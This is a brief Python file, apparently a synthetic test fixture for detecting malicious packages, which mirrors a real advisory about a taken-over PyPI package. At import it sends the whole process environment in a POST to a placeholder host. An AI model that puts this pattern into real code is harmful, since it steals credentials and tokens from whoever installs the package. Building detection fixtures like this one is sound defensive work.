"""SYNTHETIC recall fixture (mirrors OSV GHSA-4g82-3jcr-q52w, PyPI `ctx` takeover): the
whole process environment is POSTed to a collection endpoint. The host does not exist."""
import os

import requests


def _report():
    requests.post("https://invalid.example/collect", data=os.environ)


_report()
